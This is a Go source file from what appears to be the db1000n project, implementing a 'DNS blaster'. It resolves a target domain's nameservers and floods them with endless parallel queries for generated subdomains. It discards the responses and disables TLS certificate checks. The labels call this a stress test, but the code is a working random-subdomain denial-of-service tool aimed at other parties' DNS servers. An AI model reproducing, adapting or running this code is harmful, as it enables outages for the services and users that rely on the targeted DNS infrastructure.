package dnsblast

import (
	"context"
	"crypto/tls"
	"log"
	"net"
	"sync"
	"time"

	"github.com/Arriven/db1000n/src/utils"

	"github.com/miekg/dns"
)

const (
	DefaultDNSPort        = 53
	DefaultDNSOverTLSPort = 853

	UDPProtoName    = "udp"
	TCPProtoName    = "tcp"
	TCPTLSProtoName = "tcp-tls"
)

type Config struct {
	RootDomain      string
	Protocol        string        // "udp", "tcp", "tcp-tls"
	SeedDomains     []string      // Used to generate domain names using the Distinct Heavy Hitter algorithm
	Delay           time.Duration // The delay between two packets to send
	ParallelQueries int
}

type DNSBlaster struct {
	Config       *Config
	DHHGenerator *DistinctHeavyHitterGenerator
	DNSClient    *dns.Client
}

func Start(ctx context.Context, config *Config) error {
	defer utils.PanicHandler()

	log.Printf("[DNS BLAST] igniting the blaster, parameters to start: "+
		"[server=%s; proto=%s; seeds=%v; delay=%s; parallelQueries=%d]",
		config.RootDomain,
		config.Protocol,
		config.SeedDomains,
		config.Delay,
		config.ParallelQueries,
	)

	dhhGenerator, err := NewDistinctHeavyHitterGenerator(config.SeedDomains)
	if err != nil {
		return err
	}

	blaster := &DNSBlaster{
		Config:       config,
		DHHGenerator: dhhGenerator,
		DNSClient:    newDefaultDNSClient(config.Protocol),
	}

	nameservers, _ := getNameservers(config.RootDomain, config.Protocol)
	for _, nameserver := range nameservers {
		go blaster.ExecuteStressTest(nameserver, ctx)
	}

	return nil
}

func getNameservers(rootDomain string, protocol string) (res []string, err error) {
	port := ":53"
	if protocol == "tcp-tls" {
		port = ":853"
	}

	nameservers, err := net.LookupNS(rootDomain)
	if err != nil {
		return nil, err
	}
	for _, nameserver := range nameservers {
		res = append(res, nameserver.Host+port)
	}
	return res, nil
}

func (rcv *DNSBlaster) ExecuteStressTest(nameserver string, ctx context.Context) {
	defer utils.PanicHandler()

	var (
		awaitGroup    sync.WaitGroup
		reusableQuery = &QueryParameters{
			HostAndPort: nameserver,
			QName:       "", // Will be generated on each cycle
			QType:       dns.TypeA,
		}

		keepAliveCounter  = 0
		keepAliveReminder = 256
		nextLoopTicker    = time.NewTicker(rcv.Config.Delay)
	)
	defer rcv.DHHGenerator.Cancel()
	defer nextLoopTicker.Stop()

blastLoop:
	for reusableQuery.QName = range rcv.DHHGenerator.Next() {
		if keepAliveCounter == keepAliveReminder {
			log.Printf("[DNS BLAST] Still blasting to [server=%s], OK!", reusableQuery.HostAndPort)
			keepAliveCounter = 0
		} else {
			keepAliveCounter += 1
		}

		select {
		case <-ctx.Done():
			log.Printf("[DNS BLAST] DNS stress is canceled, OK!")
			break blastLoop
		default:
			// Keep going
		}

		awaitGroup.Add(rcv.Config.ParallelQueries)
		for i := 0; i < rcv.Config.ParallelQueries; i++ {
			go func() {
				defer utils.PanicHandler()
				rcv.SimpleQueryWithNoResponse(reusableQuery)
				awaitGroup.Done()
			}()
		}
		awaitGroup.Wait()

		select {
		case <-ctx.Done():
			log.Printf("[DNS BLAST] DNS stress is canceled, OK!")
			break blastLoop
		case <-nextLoopTicker.C:
			continue blastLoop
		}
	}
}

type QueryParameters struct {
	HostAndPort string
	QName       string
	QType       uint16
}

type Response struct {
	WithErr bool
	Err     error
	Latency time.Duration
}

func (rcv *DNSBlaster) SimpleQuery(parameters *QueryParameters) *Response {
	question := new(dns.Msg).
		SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)

	_, rtt, err := rcv.DNSClient.Exchange(question, parameters.HostAndPort)

	return &Response{
		WithErr: err != nil,
		Err:     err,
		Latency: rtt,
	}
}

func (rcv *DNSBlaster) SimpleQueryWithNoResponse(parameters *QueryParameters) {
	question := new(dns.Msg).
		SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)
	_, _, err := rcv.DNSClient.Exchange(question, parameters.HostAndPort)
	if err != nil {
		log.Printf("failed to complete the DNS query: %s", err)
	}
}

const (
	dialTimeout  = 1 * time.Second        // Let's not wait long if the server cannot be dialled, we all know why
	writeTimeout = 500 * time.Millisecond // Longer write timeout than read timeout just to make sure the query is uploaded
	readTimeout  = 300 * time.Millisecond // Not really interested in reading responses
)

func newDefaultDNSClient(proto string) *dns.Client {
	c := &dns.Client{
		Dialer:       &net.Dialer{Timeout: dialTimeout},
		DialTimeout:  dialTimeout,
		WriteTimeout: writeTimeout,
		ReadTimeout:  readTimeout,
		Net:          proto,
	}

	if c.Net == TCPTLSProtoName {
		c.TLSConfig = &tls.Config{
			InsecureSkipVerify: true,
		}
	}

	return c
}
